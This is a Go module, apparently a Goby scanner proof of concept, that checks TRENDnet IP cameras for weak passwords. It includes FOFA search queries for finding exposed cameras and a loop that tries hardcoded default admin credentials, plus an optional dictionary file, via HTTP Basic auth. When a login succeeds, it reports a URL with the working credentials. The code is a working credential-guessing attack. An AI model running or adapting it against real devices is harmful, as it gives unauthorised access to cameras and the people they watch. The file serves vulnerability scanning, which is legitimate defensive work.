package exploits

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"os"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Trendnet Camera Weak Password Vulnerability",
    "Description": "<p>TRENDnet is one of the world's major data network specialists.</p><p>A weak password vulnerability exists in the TRENDnet webcam, which can be exploited by attackers to obtain sensitive information.</p>",
    "Product": "TRENDnet-IP-Camera",
    "Homepage": "http://www.trendnet.com/",
    "DisclosureDate": "2018-02-05",
    "PostTime": "2023-08-20",
    "Author": "vaf",
    "FofaQuery": "header=\"netcam\" || banner=\"netcam\" || header=\"TV-\" || banner=\"TV-\" || body=\"rdr.cgi\"",
    "GobyQuery": "header=\"netcam\" || banner=\"netcam\" || header=\"TV-\" || banner=\"TV-\" || body=\"rdr.cgi\"",
    "Level": "3",
    "Impact": "<p>The attacker can control the entire web system through this weak password vulnerability, and the attacker can obtain sensitive user information from it, which may lead to further attacks.</p>",
    "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Weak Password"
    ],
    "VulType": [
        "Weak Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "趋势网络 Trendnet 摄像头弱口令漏洞",
            "Product": "TRENDnet-IP-Camera",
            "Description": "<p>TRENDnet 是全球主要数据网络专业厂商之一。&nbsp;</p><p>TRENDnet 网络摄像头存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可以通过该弱口令漏洞控制整个 web 系统，攻击者可以从中获取用户敏感信息，存在进一步攻击的可能。<br></p>",
            "VulType": [
                "弱口令"
            ],
            "Tags": [
                "弱口令"
            ]
        },
        "EN": {
            "Name": "Trendnet Camera Weak Password Vulnerability",
            "Product": "TRENDnet-IP-Camera",
            "Description": "<p>TRENDnet is one of the world's major data network specialists.</p><p>A weak password vulnerability exists in the TRENDnet webcam, which can be exploited by attackers to obtain sensitive information.</p>",
            "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>The attacker can control the entire web system through this weak password vulnerability, and the attacker can obtain sensitive user information from it, which may lead to further attacks.<br></p>",
            "VulType": [
                "Weak Password"
            ],
            "Tags": [
                "Weak Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`
	sendRequest515sdassdAS := func(hostInfo *httpclient.FixUrl, account string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/")
		cfg.Header.Store("Authorization", account)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//创建默认用户名和密码
			accountList := []string{"admin:admin", "admin:123456", "admin:123456789", "admin:qwerty", "admin:111111"}
			myDict := os.Getenv("POC_WEAK_PWD__DICT_PATH")
			//添加用户字典路径
			file, _ := os.Open(myDict)
			defer file.Close()
			//读取文件
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				accountList = append(accountList, scanner.Text())
			}
			for _, account := range accountList {
				base64Accounts := "Basic " + base64.StdEncoding.EncodeToString([]byte(account))
				resp, err := sendRequest515sdassdAS(hostInfo, base64Accounts)
				if err != nil {
					return false
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "rdr.cgi") {
					ss.VulURL = fmt.Sprintf("%s://"+account+"@%s", hostInfo.Scheme(), hostInfo.HostInfo)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			return expResult
		},
	))
}
